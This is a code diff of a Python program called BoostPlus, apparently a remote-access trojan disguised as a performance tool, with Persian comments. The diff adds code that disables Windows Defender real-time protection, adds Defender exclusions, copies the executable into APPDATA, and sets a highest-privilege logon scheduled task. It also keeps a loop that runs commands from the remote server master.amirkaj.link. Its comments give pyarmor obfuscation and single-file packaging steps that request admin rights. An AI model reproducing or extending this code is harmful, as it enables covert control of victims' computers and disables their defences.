@@ -5,12 +5,17 @@ import os
 import sys
 import threading
 import logging
+import shutil
 
 # تنظیمات لاگ
-logging.basicConfig(filename='boostplus.log', level=logging.DEBUG, 
+logging.basicConfig(filename=f'{os.getenv("APPDATA")}\\boostplus.log', level=logging.DEBUG, 
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
-#remember this : pyarmor pack -x " --exclude test" -e " --onefile" your_script.py
+#commands needed :
+# pyarmor gen boostplus.py
+# for console based --> pyinstaller --noconfirm --onefile --name "BoostPlus" --uac-admin --add-data "D:\VMP\asd\dist\pyarmor_runtime_000000;pyarmor_runtime_000000/"  "D:\VMP\asd\dist\boostplus.py"
+# for no console baes --> pyinstaller --noconfirm --onefile -w --name "BoostPlus" --uac-admin --add-data "D:\VMP\asd\dist\pyarmor_runtime_000000;pyarmor_runtime_000000/"  "D:\VMP\asd\dist\boostplus.py"
+# for removeing task : schtasks /delete /tn boostplus /f
 
 SERVER_HOST = "master.amirkaj.link"
 SERVER_PORT = 8080
@@ -32,7 +37,7 @@ def connect_to_server():
 
 def create_task(target_dir):
     try:
-        command = f'schtasks /create /tn boostplus /tr {target_dir} /sc onlogon /rl highest'
+        command = f'schtasks /create /tn boostplus /tr "{target_dir}" /sc onlogon /rl highest'
         subprocess.run(["powershell", "-Command", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
         logging.info("Task created successfully.")
     except subprocess.CalledProcessError as e:
@@ -56,6 +61,15 @@ def is_first_run():
     logging.info("Not the first run.")
     return False
 
+def copy_to_user_directory():
+    try:
+        user_dir = os.path.join(os.getenv("APPDATA"), 'boostplus.exe')
+        current_file = os.path.abspath(sys.argv[0])
+        shutil.copyfile(current_file, user_dir)
+        logging.info(f"Copied to {user_dir}")
+    except Exception as e:
+        logging.error(f"Failed to copy file: {e}")
+
 def handle_server_commands(client_socket):
     try:
         while True:
@@ -78,12 +92,24 @@ def handle_server_commands(client_socket):
     finally:
         client_socket.close()
 
+def disable_realtime_protection():
+    try:
+        command = "Set-MpPreference -DisableRealtimeMonitoring $true"
+        subprocess.run(["powershell", "-Command", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)
+        logging.info("Real time protection turned off successfully")
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Error occurred: {e}")
+
 def main():
     if is_first_run():
         startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+        file_user_dir = os.path.join(os.getenv("APPDATA"), 'boostplus.exe')
+        disable_realtime_protection()
+        copy_to_user_directory()
+        add_to_defender_exclusion(file_user_dir)
         add_to_defender_exclusion(os.path.abspath(sys.argv[0]))
         add_to_defender_exclusion(startup_dir)
-        create_task(os.path.abspath(sys.argv[0]))
+        create_task(file_user_dir)
 
     while True:
         client_socket = connect_to_server()
